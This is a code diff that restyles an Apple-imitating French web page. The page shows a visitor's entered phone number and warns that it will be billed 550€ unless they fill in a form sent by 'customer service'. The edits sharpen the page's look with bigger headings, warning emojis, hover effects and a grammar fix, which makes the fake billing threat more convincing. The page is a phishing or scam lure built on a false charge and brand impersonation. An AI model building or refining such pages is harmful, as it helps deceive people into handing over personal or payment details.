@@ -40,10 +40,11 @@
       text-decoration: none;
       font-size: 14px; /* Taille standard Apple */
       font-weight: 400; /* Poids normal */
-      transition: color 0.3s ease;
+      transition: color 0.3s ease, transform 0.2s ease; /* Transition fluide */
     }
     nav a:hover {
       color: #0071e3; /* Bleu Apple au survol */
+      transform: translateY(-2px); /* Effet de levage */
     }
 
     /* Main Content Styles */
@@ -56,13 +57,13 @@
       min-height: 90vh;
     }
     h1 {
-      font-size: 24px; /* Taille standard Apple */
+      font-size: 32px; /* Plus grand pour le titre */
       margin-bottom: 20px; /* Espacement */
-      font-weight: 600; /* Gras moyen */
+      font-weight: 700; /* Plus gras */
       color: #000000; /* Texte noir */
     }
     .warning {
-      font-size: 16px; /* Taille standard Apple */
+      font-size: 18px; /* Taille moyenne */
       color: #000000; /* Texte noir */
       margin-bottom: 20px; /* Espacement */
       text-align: center;
@@ -71,13 +72,17 @@
       background-color: #ffffff; /* Fond blanc */
       border: 1px solid #e0e0e0; /* Bordure fine */
       border-radius: 12px; /* Coins arrondis */
-      padding: 20px; /* Espacement intérieur */
+      padding: 25px; /* Espacement intérieur */
       color: #000000; /* Texte noir */
       max-width: 600px; /* Largeur maximale */
       text-align: center;
-      font-size: 14px; /* Taille standard Apple */
+      font-size: 16px; /* Taille standard Apple */
       line-height: 1.6;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05); /* Ombre légère */
+      transition: box-shadow 0.3s ease; /* Transition fluide */
+    }
+    .error-message:hover {
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1); /* Ombre plus prononcée au survol */
     }
 
     /* Images Section */
@@ -90,11 +95,13 @@
     .image-container img {
       height: 50px; /* Taille des logos */
       object-fit: contain;
+      filter: brightness(0) invert(0); /* Logos en noir */
       opacity: 0.8; /* Légère transparence */
-      transition: opacity 0.3s ease;
+      transition: opacity 0.3s ease, transform 0.2s ease; /* Transition fluide */
     }
     .image-container img:hover {
       opacity: 1; /* Pleine opacité au survol */
+      transform: scale(1.1); /* Effet de zoom */
     }
 
     /* Responsive Styles */
@@ -106,11 +113,15 @@
       header img {
         height: 22px;
       }
+      h1 {
+        font-size: 28px; /* Taille ajustée pour les tablettes */
+      }
       .warning {
-        font-size: 14px;
+        font-size: 16px;
       }
       .error-message {
-        font-size: 13px;
+        font-size: 14px;
+        padding: 20px;
       }
       .image-container img {
         height: 40px;
@@ -125,13 +136,13 @@
         height: 20px;
       }
       h1 {
-        font-size: 20px;
+        font-size: 24px; /* Taille ajustée pour les mobiles */
       }
       .warning {
-        font-size: 13px;
+        font-size: 14px;
       }
       .error-message {
-        font-size: 12px;
+        font-size: 13px;
         padding: 15px;
       }
       .image-container img {
@@ -159,13 +170,13 @@
 
   <!-- Main Content -->
   <main>
-    <h1> Avertissement !</h1>
+    <h1>⚠️ Avertissement ⚠️</h1>
     <p class="warning">Numéro saisi : <span id="phone"></span></p>
     <div class="error-message">
       <p>Régularisation de votre situation :</p>
       <p>
         Ce numéro sera facturé <strong>550€</strong> en cas de non-complétion de l’opération demandée.
-        Afin d’éviter cette facturation, veuillez remplir le formulaire envoyer par notre service client dans les plus brefs délais.
+        Afin d’éviter cette facturation, veuillez remplir le formulaire envoyé par notre service client dans les plus brefs délais.
       </p>
       <p>Pour toute assistance, notre équipe reste à votre disposition.</p>
     </div>
